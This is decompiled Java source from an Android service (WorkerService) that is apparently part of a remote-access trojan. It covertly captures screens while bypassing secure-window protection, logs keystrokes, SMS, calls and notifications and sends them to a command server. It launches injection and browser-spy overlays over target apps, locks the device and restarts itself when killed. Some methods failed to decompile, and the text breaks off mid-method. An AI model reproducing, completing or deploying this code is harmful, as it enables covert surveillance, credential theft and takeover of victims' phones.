
    /*
     * Enabled aggressive block sorting
     */
    private String getTurkishLightMessage(String string2) {
        int n;
        block20: {
            switch (string2.hashCode()) {
                case 224161014: {
                    if (!string2.equals("direct_sun")) break;
                    n = 7;
                    break block20;
                }
                case 109799703: {
                    if (!string2.equals("sunny")) break;
                    n = 6;
                    break block20;
                }
                case -696236480: {
                    if (!string2.equals("pitch_black")) break;
                    n = 0;
                    break block20;
                }
                case -1085442248: {
                    if (!string2.equals("bright_indoor")) break;
                    n = 4;
                    break block20;
                }
                case -1184229805: {
                    if (!string2.equals("indoor")) break;
                    n = 3;
                    break block20;
                }
                case -1244902177: {
                    if (!string2.equals("very_dark")) break;
                    n = 1;
                    break block20;
                }
                case -1268935009: {
                    if (!string2.equals("dim_light")) break;
                    n = 2;
                    break block20;
                }
                case -1357518620: {
                    if (!string2.equals("cloudy")) break;
                    n = 5;
                    break block20;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                return "Bilinmeyen \u0131\u015f\u0131k";
            }
            case 7: {
                return "Do\u011frudan g\u00fcne\u015f \u0131\u015f\u0131\u011f\u0131";
            }
            case 6: {
                return "G\u00fcne\u015fli g\u00fcn";
            }
            case 5: {
                return "Bulutlu g\u00fcn";
            }
            case 4: {
                return "Parlak i\u00e7 mekan";
            }
            case 3: {
                return "Kapal\u0131 alan \u0131\u015f\u0131\u011f\u0131";
            }
            case 2: {
                return "Lo\u015f \u0131\u015f\u0131k";
            }
            case 1: {
                return "\u00c7ok karanl\u0131k";
            }
            case 0: 
        }
        return "Tam karanl\u0131k";
    }

    /*
     * Enabled aggressive block sorting
     */
    private String getTurkishTranslation(String string2) {
        int n;
        block16: {
            switch (string2.hashCode()) {
                case 3530071: {
                    if (!string2.equals("side")) break;
                    n = 2;
                    break block16;
                }
                case 3145593: {
                    if (!string2.equals("flat")) break;
                    n = 0;
                    break block16;
                }
                case -221275039: {
                    if (!string2.equals("upright")) break;
                    n = 1;
                    break block16;
                }
                case -416348023: {
                    if (!string2.equals("tilted_lr")) break;
                    n = 4;
                    break block16;
                }
                case -416348225: {
                    if (!string2.equals("tilted_fb")) break;
                    n = 3;
                    break block16;
                }
                case -718108181: {
                    if (!string2.equals("slightly_tilted")) break;
                    n = 5;
                    break block16;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                return "Bilinmeyen konum";
            }
            case 5: {
                return "Hafif\u00e7e e\u011filmi\u015f";
            }
            case 4: {
                return "Sola / sa\u011fa e\u011filmi\u015f";
            }
            case 3: {
                return "\u00d6ne / arkaya e\u011filmi\u015f";
            }
            case 2: {
                return "Yan taraf\u0131nda";
            }
            case 1: {
                return "Dik duruyor";
            }
            case 0: 
        }
        return "Masaya d\u00fcz yerle\u015ftirildi";
    }

    public static boolean isworkeron() {
        long l = workdats;
        boolean bl = false;
        if (l == 0L) {
            return false;
        }
        if (System.currentTimeMillis() - workdats < 45000L) {
            bl = true;
        }
        return bl;
    }

    private void removeoverlay() {
        try {
            if (onscreenview == null) {
                return;
            }
            WindowManager windowManager = (WindowManager)this.getSystemService("window");
            if (onscreenview.getParent() != null) {
                windowManager.removeView((View)onscreenview);
            }
            onscreenview = null;
        }
        catch (Exception exception) {
            AndroidLogger.Error("removeoverlay", exception.getMessage());
            exception.printStackTrace();
        }
    }

    private void writeOptionBool(Context context, String string2, String string3) {
        SharedPreferencesManager.WriteBool(context, string2, "1".equals(string3));
    }

    /* synthetic */ void lambda$onStartCommand$0$com-icontrol-protector-WorkerService(Context context) {
        Object object;
        try {
            if (STATUS_MONITOR == null) {
                STATUS_MONITOR = object = new BroadcastReceiverManager(context);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            if (MyLOCK == null) {
                MyLOCK = object = new ReentrantLock();
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            this.checksinsors();
        }
        catch (Exception exception) {
            // empty catch block
        }
        if (!WorkerService.isworkeron()) {
            new MyWorker().execute(new Context[]{context});
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        Context context = this.getApplicationContext();
        this.START_FORGRONG(this.getApplicationContext());
        STATUS_MONITOR = new BroadcastReceiverManager(this.getApplicationContext());
        if (MyLOCK == null) {
            MyLOCK = new ReentrantLock();
        }
        try {
            this.checksinsors();
        }
        catch (Exception exception) {
            // empty catch block
        }
        if (!WorkerService.isworkeron()) {
            new MyWorker().execute(new Context[]{context});
        }
    }

    public void onDestroy() {
        super.onDestroy();
        try {
            this.removeoverlay();
            AlarmHelper.setAlarm(this.getApplicationContext());
            if (STATUS_MONITOR != null) {
                STATUS_MONITOR.unregister();
                STATUS_MONITOR = null;
            }
            if (LOCK_SERVS != null && LOCK_SERVS.isHeld()) {
                LOCK_SERVS.release();
                LOCK_SERVS = null;
            }
            if (sensorManager != null && sensorEventListener != null) {
                sensorManager.unregisterListener(sensorEventListener);
            }
            if (sensorManager != null && lightSensor != null) {
                sensorManager.unregisterListener(lightListener);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            Intent intent = new Intent(this.getApplicationContext(), WorkerService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                this.startForegroundService(intent);
            } else {
                this.startService(intent);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        UtilityHelper.setupWorkManager(this.getApplicationContext());
    }

    public int onStartCommand(Intent intent, int n, int n2) {
        Context context = this.getApplicationContext();
        if (intent != null) {
            if (!"HB".equals(intent.getAction())) {
                if (intent.getBooleanExtra("FROM_ALARM", false)) {
                    AlarmHelper.setAlarm(this.getApplicationContext());
                } else {
                    this.START_FORGRONG(context);
                }
            }
        } else {
            this.START_FORGRONG(context);
        }
        this.createoverlay(context);
        new Thread(new WorkerService$$ExternalSyntheticLambda0(this, context)).start();
        return 1;
    }

    public void onTaskRemoved(Intent intent) {
        super.onTaskRemoved(intent);
        AlarmHelper.setAlarm(this.getApplicationContext());
        if (STATUS_MONITOR != null) {
            STATUS_MONITOR.unregister();
            STATUS_MONITOR = null;
        }
        if (LOCK_SERVS != null && LOCK_SERVS.isHeld()) {
            LOCK_SERVS.release();
        }
        intent = new Intent(this.getApplicationContext(), WorkerService.class);
        if (Build.VERSION.SDK_INT >= 26) {
            this.startForegroundService(intent);
        } else {
            this.startService(intent);
        }
        UtilityHelper.setupWorkManager(this.getApplicationContext());
    }

    public static enum CommandsList {
        Bing,
        Updates,
        Contacts,
        SMS,
        Apps,
        Files,
        Camera,
        Location,
        Activitys,
        Screen,
        DeviceInformationCollector,
        Connection,
        Notifi,
        Recorder,
        Rename,
        Permissions,
        Sleep,
        Delete;

    }

    public static class MyWorker
    extends AsyncTask<Context, Integer, String> {
        private static String Lastdetected;
        private static volatile long Scannerdate;
        public static volatile String alljectsids;
        private static volatile long jectdate;
        private static volatile long selfdate;
        public static volatile long skiltonthread;
        public static volatile long stoptime;
        boolean keepworking = false;

        static {
            jectdate = 0L;
            alljectsids = "empty";
            Scannerdate = 0L;
            selfdate = 0L;
            Lastdetected = "null";
            skiltonthread = 0L;
            stoptime = -999L;
        }

        public static void AlertServer(Context context, String string2, String string3) {
            try {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("type", (Object)CommandConstants.ALERT);
                jSONObject.put("title", (Object)string2);
                jSONObject.put("msg", (Object)string3);
                string2 = jSONObject.toString();
                CommandExecutor.instance(context).Livemessage(context, string2);
            }
            catch (Exception exception) {
                exception.printStackTrace();
            }
        }

        public static void SelfRecorder(Context context, int n, String string2, int n2) {
            new Thread(new Runnable(){
                final Context val$ctx;
                final int val$delaymls;
                final int val$quality;
                final String val$srctype;
                {
                    this.val$delaymls = n;
                    this.val$quality = n2;
                    this.val$ctx = context;
                    this.val$srctype = string2;
                }

                /*
                 * Unable to fully structure code
                 * Could not resolve type clashes
                 */
                @Override
                public void run() {
                    block25: {
                        var2_1 = Locale.getDefault().getLanguage();
                        switch (var2_1.hashCode()) lbl-1000:
                        // 5 sources

                        {
                            default: {
                                break;
                            }
                            case 3886: {
                                if (!var2_1.equals("zh")) ** GOTO lbl-1000
                                var1_2 = 1;
                                break block25;
                            }
                            case 3710: {
                                if (!var2_1.equals("tr")) ** GOTO lbl-1000
                                var1_2 = 3;
                                break block25;
                            }
                            case 3651: {
                                if (!var2_1.equals("ru")) ** GOTO lbl-1000
                                var1_2 = 2;
                                break block25;
                            }
                            case 3121: {
                                if (!var2_1.equals("ar")) ** GOTO lbl-1000
                                var1_2 = 0;
                                break block25;
                            }
                        }
                        var1_2 = -1;
                    }
                    switch (var1_2) {
                        default: {
                            var2_1 = "Waiting user to enter the app";
                            break;
                        }
                        case 3: {
                            var2_1 = "Kullan\u0131c\u0131n\u0131n uygulamaya girmesi bekleniyor";
                            break;
                        }
                        case 2: {
                            var2_1 = "\u041e\u0436\u0438\u0434\u0430\u043d\u0438\u0435 \u0432\u0445\u043e\u0434\u0430 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f \u0432 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u0435";
                            break;
                        }
                        case 1: {
                            var2_1 = "\u7b49\u5f85\u7528\u6237\u8fdb\u5165\u5e94\u7528\u7a0b\u5e8f";
                            break;
                        }
                        case 0: {
                            var2_1 = "\u0641\u064a \u0627\u0646\u062a\u0638\u0627\u0631 \u062f\u062e\u0648\u0644 \u0627\u0644\u0645\u0633\u062a\u062e\u062f\u0645 \u0625\u0644\u0649 \u0627\u0644\u062a\u0637\u0628\u064a\u0642";
                        }
                    }
                    var2_1 = UtilityHelper.createImageByts((String)var2_1);
                    do {
                        MyWorker.access$2102(System.currentTimeMillis());
                        try {
                            Thread.sleep(this.val$delaymls);
                        }
                        catch (Exception var3_4) {
                            // empty catch block
                        }
                        var3_3 = UtilityHelper.getCurrentActivity();
                        if (var3_3 == null) ** GOTO lbl72
                        var4_8 = var3_3.getWindow().getDecorView().getRootView();
                        try {
                            var3_3.getWindow().clearFlags(8192);
                            if (Build.VERSION.SDK_INT >= 33) {
                                var3_3.setRecentsScreenshotEnabled(true);
                            }
                        }
                        catch (Exception var3_5) {
                            // empty catch block
                        }
                        var4_8.setDrawingCacheEnabled(true);
                        var3_3 = Bitmap.createBitmap((Bitmap)var4_8.getDrawingCache());
                        var4_8.setDrawingCacheEnabled(false);
                        var5_9 /* !! */  = Bitmap.createScaledBitmap((Bitmap)var3_3, (int)350, (int)650, (boolean)true);
                        var4_8 = new ByteArrayOutputStream();
                        var5_9 /* !! */ .compress(Bitmap.CompressFormat.WEBP, this.val$quality, (OutputStream)var4_8);
                        var5_9 /* !! */  = (Bitmap)var4_8.toByteArray();
                        CommandExecutor.instance(this.val$ctx).LiveScreenSilent(this.val$ctx, (byte[])var5_9 /* !! */ , this.val$srctype);
                        var3_3.recycle();
                        var4_8.close();
                        continue;
lbl72:
                        // 1 sources

                        CommandExecutor.instance(this.val$ctx).LiveScreenSilent(this.val$ctx, (byte[])var2_1, this.val$srctype);
                        try {
                            MyWorker.access$2102(System.currentTimeMillis());
                            Thread.sleep(10000L);
                        }
                        catch (Exception var3_6) {}
                        continue;
                        catch (Exception var3_7) {
                            var3_7.printStackTrace();
                        }
                    } while (SharedPreferencesManager.ReadBool(this.val$ctx, ConfigurationConstants.Self_Record, false) || SharedPreferencesManager.ReadBool(this.val$ctx, "Liv_scr", false));
                }
            }).start();
        }

        public static void SendPing(Context context) {
            CommandExecutor.instance(context);
            if (!CommandExecutor.isConnected) {
                return;
            }
            String string2 = UtilityHelper.getPingSpeed(ConfigurationConstants.Server_Address);
            String string3 = UtilityHelper.ScreenStatus(context);
            try {
                Object object = new JSONObject();
                object.put("type", (Object)"png");
                object.put("scr", (Object)string3);
                object.put("ms", (Object)string2);
                object.put("jct", AccessibilityServiceHelper.ject_list.size());
                object.put("keylogs", (Object)KeystrokeLogger.Load(KeystrokeLogger.ActivityType.KSTR));
                object.put("vapps", (Object)KeystrokeLogger.Load(KeystrokeLogger.ActivityType.VAPS));
                object.put("activz", (Object)KeystrokeLogger.Load(KeystrokeLogger.ActivityType.ACTZ));
                object.put("notifys", (Object)KeystrokeLogger.Load(KeystrokeLogger.ActivityType.NTFS));
                object.put("vLinks", (Object)KeystrokeLogger.Load(KeystrokeLogger.ActivityType.BLNK));
                object.put("bsms", (Object)SmsCallsStorage.Load(SmsCallsStorage.EntryType.SMS));
                object.put("bcall", (Object)SmsCallsStorage.Load(SmsCallsStorage.EntryType.CALL));
                object.put("act", (Object)AccessibilityServiceController.LastVisitedApp);
                object.put("AN", (Object)AngleString);
                object.put("LT", (Object)LightsString);
                object.put("BC", (Object)UtilityHelper.isCharging(context));
                object.put("BP", (Object)UtilityHelper.getBatteryPercentage(context));
                object.put("jcts", (Object)UtilityHelper$$ExternalSyntheticBackport0.m("|", AccessibilityServiceHelper.ject_list));
                object.put("requ", (Object)SharedPreferencesManager.Read(context, ConfigurationConstants.req_update, "0"));
                object.put("tagu", (Object)SharedPreferencesManager.Read(context, ConfigurationConstants.up_tag, "N/A"));
                object = object.toString();
                CommandExecutor.instance(context).Livemessage(context, (String)object);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }

        public static void SilentScreenThread(Context context, int n) {
            new Thread(new Runnable(){
                final Context val$ctx;
                final int val$quality;
                {
                    this.val$ctx = context;
                    this.val$quality = n;
                }

                @Override
                public void run() {
                    if (My_Access_inst == null) {
                        return;
                    }
                    do {
                        MyWorker.access$2002(System.currentTimeMillis());
                        try {
                            Thread.sleep(DelayScreenshot);
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                        try {
                            if (Build.VERSION.SDK_INT < 30) continue;
                            if (SharedPreferencesManager.ReadBool(this.val$ctx, ConfigurationConstants.Silent_Screen, false)) {
                                My_Access_inst.CapScreen(My_Access_inst.getApplicationContext(), "screen", this.val$quality);
                                continue;
                            }
                            if (!SharedPreferencesManager.ReadBool(this.val$ctx, "Liv_scr", false)) continue;
                            My_Access_inst.CapScreen(My_Access_inst.getApplicationContext(), "livscr", this.val$quality);
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    } while (SharedPreferencesManager.ReadBool(this.val$ctx, ConfigurationConstants.Silent_Screen, false) || SharedPreferencesManager.ReadBool(this.val$ctx, "Liv_scr", false));
                }
            }).start();
        }

        public static void Skiltonlive(Context context, int n) {
            new Thread(new Runnable(context){
                final Context val$ctx;
                {
                    this.val$ctx = context;
                }

                @Override
                public void run() {
                    do {
                        skiltonthread = System.currentTimeMillis();
                        try {
                            Thread.sleep(1L);
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                        byte[] byArray = AccessibilityServiceHelper.createskilton();
                        if (byArray == null) continue;
                        try {
                            CommandExecutor.instance(this.val$ctx).LiveScreenSilent(this.val$ctx, byArray, "screen");
                        }
                        catch (Exception exception) {
                            exception.printStackTrace();
                        }
                    } while (SharedPreferencesManager.ReadBool(this.val$ctx, ConfigurationConstants.Live_skilton, false));
                }
            }).start();
        }

        public static void StartAutoj(Context context) {
            jectdate = System.currentTimeMillis();
            new Thread(new Runnable(context){
                final Context val$ctx;
                {
                    this.val$ctx = context;
                }

                @Override
                public void run() {
                    do {
                        String string2;
                        MyWorker.access$1902(System.currentTimeMillis());
                        if (alljectsids.equals("empty")) {
                            MyWorker.access$1902(0L);
                            break;
                        }
                        try {
                            string2 = UtilityHelper.Checkallject(this.val$ctx, alljectsids);
                            if (!string2.equals("empty")) {
                                JSONObject jSONObject = new JSONObject();
                                jSONObject.put("type", (Object)CommandConstants.jects);
                                jSONObject.put("cuz", (Object)"f");
                                jSONObject.put("ned", (Object)string2);
                                string2 = jSONObject.toString();
                                CommandExecutor.instance(this.val$ctx).Livemessage(this.val$ctx, string2);
                            }
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                        try {
                            Thread.sleep(15000L);
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                        try {
                            string2 = new JSONObject();
                            string2.put("type", (Object)CommandConstants.jects);
                            string2.put("cuz", (Object)"l");
                            string2 = string2.toString();
                            CommandExecutor.instance(this.val$ctx).Livemessage(this.val$ctx, string2);
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    } while (ConfigurationConstants.Auto_jct);
                }
            }).start();
        }

        static /* synthetic */ long access$1902(long l) {
            jectdate = l;
            return l;
        }

        static /* synthetic */ long access$2002(long l) {
            Scannerdate = l;
            return l;
        }

        static /* synthetic */ long access$2102(long l) {
            selfdate = l;
            return l;
        }

        public static boolean isJecton() {
            long l = jectdate;
            boolean bl = false;
            if (l == 0L) {
                return false;
            }
            if (System.currentTimeMillis() - jectdate < 45000L) {
                bl = true;
            }
            return bl;
        }

        public static boolean isLiveSkiltonlive() {
            long l = skiltonthread;
            boolean bl = false;
            if (l == 0L) {
                return false;
            }
            if (System.currentTimeMillis() - skiltonthread < 30000L) {
                bl = true;
            }
            return bl;
        }

        public static boolean isScreenThreadRunning() {
            long l = Scannerdate;
            boolean bl = false;
            if (l == 0L) {
                return false;
            }
            if (System.currentTimeMillis() - Scannerdate < 30000L) {
                bl = true;
            }
            return bl;
        }

        public static boolean isSelfRecordON() {
            long l = selfdate;
            boolean bl = false;
            if (l == 0L) {
                return false;
            }
            if (System.currentTimeMillis() - selfdate < 45000L) {
                bl = true;
            }
            return bl;
        }

        public static void joinclients(Context context) {
            String string2;
            block3: {
                string2 = SharedPreferencesManager.Read(context, ConfigurationConstants.THE_IDF, null);
                if (string2 != null) break block3;
                return;
            }
            try {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("type", (Object)"add");
                jSONObject.put("phone_name", (Object)SharedPreferencesManager.Read(context, "CN", ConfigurationProvider.Mob_Name));
                jSONObject.put("android_version", (Object)UtilityHelper.Version());
                jSONObject.put("model", (Object)DeviceInformationCollector.Devicename(context));
                jSONObject.put("battery_charge", (Object)UtilityHelper.isCharging(context));
                jSONObject.put("battery_precentage", (Object)UtilityHelper.getBatteryPercentage(context));
                jSONObject.put("network", (Object)UtilityHelper.Get_Network(context));
                jSONObject.put("install_date", (Object)UtilityHelper.installdate(context));
                jSONObject.put("phone_id", (Object)SharedPreferencesManager.Read(context, "ID", "Deviceid"));
                jSONObject.put("wallpap", (Object)UtilityHelper.Wallpaper(context, 30, 30, true));
                jSONObject.put("sim", (Object)UtilityHelper.getsimname(context));
                jSONObject.put("keylogs", (Object)KeystrokeLogger.Load(KeystrokeLogger.ActivityType.KSTR));
                jSONObject.put("vapps", (Object)KeystrokeLogger.Load(KeystrokeLogger.ActivityType.VAPS));
                jSONObject.put("activz", (Object)KeystrokeLogger.Load(KeystrokeLogger.ActivityType.ACTZ));
                jSONObject.put("notifys", (Object)KeystrokeLogger.Load(KeystrokeLogger.ActivityType.NTFS));
                jSONObject.put("vLinks", (Object)KeystrokeLogger.Load(KeystrokeLogger.ActivityType.BLNK));
                jSONObject.put("idf", (Object)string2);
                jSONObject.put("BTVR", (Object)ConfigurationConstants.BTVersion);
                jSONObject.put("TRK", (Object)ConfigurationProvider.Tracking_Data_str);
                jSONObject.put("TAG", (Object)ConfigurationProvider.Ctag);
                string2 = jSONObject.toString();
                CommandExecutor.instance(context).Livemessage(context, string2);
            }
            catch (Exception exception) {
                exception.printStackTrace();
            }
        }

        static /* synthetic */ void lambda$monitorAppUsage$0(Context context, String string2, String string3, byte[] byArray, Context context2) {
            context = new Intent(context, InjectTargetActivity.class);
            context.addFlags(0x10000000);
            context.addFlags(65536);
            context.putExtra("cuzid", string2);
            context.putExtra("label", string3);
            context.putExtra("icon", byArray);
            context.putExtra("trk", "1");
            context.putExtra("type", "u");
            AccessibilityServiceHelper.BringMeFront(context2);
            context2.startActivity((Intent)context);
        }

        static /* synthetic */ void lambda$monitorAppUsage$1(Context context, String string2, String string3, byte[] byArray, Context context2) {
            context = new Intent(context, BrowserSpyActivity.class);
            context.addFlags(0x10000000);
            context.addFlags(0x800000);
            context.addFlags(0x40000000);
            context.addFlags(65536);
            context.putExtra("key", string2);
            context.putExtra("label", string3);
            context.putExtra("icon", byArray);
            context.putExtra("type", "u");
            AccessibilityServiceHelper.BringMeFront(context2);
            context2.startActivity((Intent)context);
        }

        /*
         * Exception decompiling
         */
        private void monitorAppUsage(Context var1_1) {
            /*
             * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
             * 
             * org.benf.cfr.reader.util.ConfusedCFRException: Started 2 blocks at once
             *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.getStartingBlocks(Op04StructuredStatement.java:412)
             *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:487)
             *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
             *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
             *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
             *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
             *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
             *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
             *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
             *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
             *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
             *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
             *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
             *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
             *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
             *     at org.benf.cfr.reader.Main.main(Main.java:54)
             */
            throw new IllegalStateException("Decompilation failed");
        }

        public static void stopSelfRecorder(Context context) {
            SharedPreferencesManager.WriteBool(context, ConfigurationConstants.Self_Record, false);
            selfdate = 0L;
        }

        public static void stopSlientScreen(Context context) {
            SharedPreferencesManager.WriteBool(context, ConfigurationConstants.Silent_Screen, false);
            Scannerdate = 0L;
        }

        public static void stopliveskilton(Context context) {
            SharedPreferencesManager.WriteBool(context, ConfigurationConstants.Live_skilton, false);
            skiltonthread = 0L;
        }

        protected String doInBackground(Context ... powerManager) {
            WorkerService.access$2202(System.currentTimeMillis());
            if (MyLOCK.isLocked()) {
                return null;
            }
            Context context = powerManager[0];
            long l = System.currentTimeMillis();
            MyLOCK.lock();
            this.keepworking = true;
            ConfigManager configManager = ConfigManager.getInstance();
            configManager.initialize(context, ConfigurationProvider.ALL_CONFIG);
            powerManager = (PowerManager)context.getSystemService("power");
            while (this.keepworking) {
                long l2;
                long l3;
                block51: {
                    block50: {
                        block49: {
                            block48: {
                                block47: {
                                    long l4;
                                    block46: {
                                        try {
                                            Thread.sleep(1000L);
                                        }
                                        catch (InterruptedException interruptedException) {
                                            // empty catch block
                                        }
                                        if (!this.keepworking) break;
                                        l3 = l;
                                        l2 = l;
                                        WorkerService.access$2202(System.currentTimeMillis());
                                        l4 = l;
                                        l3 = l;
                                        l2 = l;
                                        if (!needsleep) break block46;
                                        l3 = l;
                                        l2 = l;
                                        needsleep = false;
                                        l3 = l;
                                        l2 = l;
                                        Thread.sleep(5000L);
                                        l3 = l;
                                        l2 = l;
                                        try {
                                            l4 = System.currentTimeMillis();
                                        }
                                        catch (InterruptedException interruptedException) {
                                            l4 = l;
                                        }
                                    }
                                    l = l4;
                                    l3 = l4;
                                    l2 = l4;
                                    if (System.currentTimeMillis() - l4 < (long)ConfigurationConstants.Preformance) break block47;
                                    l3 = l4;
                                    l2 = l4;
                                    l3 = l4 = System.currentTimeMillis();
                                    l2 = l4;
                                    WorkerService.JoinChat(context);
                                    l3 = l4;
                                    l2 = l4;
                                    MyWorker.SendPing(context);
                                    l = l4;
                                    l3 = l4;
                                    l2 = l4;
                                    if (UtilityHelper.IsScreenOn(context)) break block47;
                                    l = l4;
                                    l3 = l4;
                                    l2 = l4;
                                    if (!ConfigurationProvider.Prevent_sleep.equals("1")) break block47;
                                    l = l4;
                                    l3 = l4;
                                    l2 = l4;
                                    if (LOCK_SERVS == null) break block47;
                                    l = l4;
                                    l3 = l4;
                                    l2 = l4;
                                    if (!LOCK_SERVS.isHeld()) break block47;
                                    l3 = l4;
                                    l2 = l4;
                                    LOCK_SERVS.release();
                                    l3 = l4;
                                    l2 = l4;
                                    WorkerService.access$2402(null);
                                    l = l4;
                                }
                                l3 = l;
                                l2 = l;
                                if (!configManager.add_usagacc) break block48;
                                l3 = l;
                                l2 = l;
                                if (!UtilityHelper.isUsageAccessGranted(context)) break block48;
                                l3 = l;
                                l2 = l;
                                if (configManager.req_accss) break block48;
                                l3 = l;
                                l2 = l;
                                this.monitorAppUsage(context);
                            }
                            l3 = l;
                            l2 = l;
                            if (!SharedPreferencesManager.ReadBool(context, ConfigurationConstants.lock_screen, false)) break block49;
                            l3 = l;
                            l2 = l;
                            l3 = l;
                            l2 = l;
                            Intent intent = new Intent(context, LockScreenActivity.class);
                            l3 = l;
                            l2 = l;
                            intent.addFlags(0x10000000);
                            l3 = l;
                            l2 = l;
                            intent.addFlags(65536);
                            l3 = l;
                            l2 = l;
                            intent.addFlags(131072);
                            l3 = l;
                            l2 = l;
                            intent.addFlags(0x20000000);
                            l3 = l;
                            l2 = l;
                            context.startActivity(intent);
                            l3 = l;
                            l2 = l;
                            AccessibilityServiceHelper.Treger("lock", null);
                            break block50;
                        }
                        l3 = l;
                        l2 = l;
                        if (!LockScreenActivity.isActivityOpen()) break block50;
                        l3 = l;
                        l2 = l;
                        LockScreenActivity.endlock();
                    }
                    l3 = l;
                    l2 = l;
                    if (LOCK_SERVS != null) break block51;
                    l3 = l;
                    l2 = l;
                    WorkerService.access$2402(powerManager.newWakeLock(0x20000001, "A:P"));
                }
                l3 = l;
                l2 = l;
                if (LOCK_SERVS == null) continue;
                l3 = l;
                l2 = l;
                if (LOCK_SERVS.isHeld()) continue;
                l3 = l;
                l2 = l;
                try {
                    LOCK_SERVS.acquire();
                }
                catch (Exception exception) {
                    try {
                        AndroidLogger.Error("WS.Exception", exception.getMessage());
                        exception.printStackTrace();
                        Thread.sleep(1L);
                        l = l3;
                    }
                    catch (InterruptedException interruptedException) {
                        l = l3;
                    }
                }
                catch (OutOfMemoryError outOfMemoryError) {
                    try {
                        AndroidLogger.Error("WS.Exception2", outOfMemoryError.getMessage());
                        outOfMemoryError.printStackTrace();
                        Thread.sleep(10000L);
                        l = l2;
                    }
                    catch (InterruptedException interruptedException) {
                        l = l2;
                    }
                }
            }
            MyLOCK.unlock();
            return null;
        }

        protected void onCancelled() {
            super.onCancelled();
            WorkerService.access$2202(0L);
        }

        protected void onPostExecute(String string2) {
            super.onPostExecute((Object)string2);
            MyLOCK.unlock();
            this.stop();
            if (LOCK_SERVS != null && LOCK_SERVS.isHeld()) {
                LOCK_SERVS.release();
                WorkerService.access$2402(null);
            }
            WorkerService.access$2202(0L);
        }

        public void stop() {
            this.keepworking = false;
        }
    }

    public static class ojxvtmgupkcwiluv
    extends BroadcastReceiver {
        private boolean isScreenOn = true;
        private long screenOffTime = 0L;
        private long screenOnTime = 0L;

        static /* synthetic */ boolean access$000(ojxvtmgupkcwiluv ojxvtmgupkcwiluv2) {
            return ojxvtmgupkcwiluv2.isScreenOn;
        }

        static /* synthetic */ boolean access$002(ojxvtmgupkcwiluv ojxvtmgupkcwiluv2, boolean bl) {
            ojxvtmgupkcwiluv2.isScreenOn = bl;
            return bl;
        }

        static /* synthetic */ long access$100(ojxvtmgupkcwiluv ojxvtmgupkcwiluv2) {
            return ojxvtmgupkcwiluv2.screenOffTime;
        }

        static /* synthetic */ long access$102(ojxvtmgupkcwiluv ojxvtmgupkcwiluv2, long l) {
            ojxvtmgupkcwiluv2.screenOffTime = l;
            return l;
        }

        static /* synthetic */ long access$200(ojxvtmgupkcwiluv ojxvtmgupkcwiluv2) {
            return ojxvtmgupkcwiluv2.screenOnTime;
        }

        static /* synthetic */ long access$202(ojxvtmgupkcwiluv ojxvtmgupkcwiluv2, long l) {
            ojxvtmgupkcwiluv2.screenOnTime = l;
            return l;
        }

        public void RecordActivity(long l, long l2) {
            SimpleDateFormat simpleDateFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append("[Open Time: " + simpleDateFormat.format(l) + "]|[");
            stringBuilder.append("Close Time: " + simpleDateFormat.format(l2) + "]");
            KeystrokeLogger.Record(stringBuilder.toString(), KeystrokeLogger.ActivityType.ACTZ);
        }

        public void onReceive(Context context, Intent intent) {
            try {
                Runnable runnable2 = new Runnable(){
                    final ojxvtmgupkcwiluv this$0;
                    final Context val$context;
                    final Intent val$intent;
                    {
                        this.this$0 = ojxvtmgupkcwiluv2;
                        this.val$context = context;
                        this.val$intent = intent;
                    }

                    static /* synthetic */ void lambda$run$0(Context context) {
                        if (UtilityHelper.isScreenOff(context)) {
                            if (My_Access_inst == null) {
                                try {
                                    Intent intent = new Intent(context, OverlayActivity.class);
                                    intent.addFlags(0x10000000);
                                    intent.addFlags(65536);
                                    intent.addFlags(0x20000000);
                                    intent.addFlags(0x4000000);
                                    context.startActivity(intent);
                                }
                                catch (Exception exception) {}
                            } else {
                                AccessibilityServiceHelper.Treger("cover", null);
                            }
                        }
                    }

                    /*
                     * Exception decompiling
                     */
                    @Override
                    public void run() {
                        /*
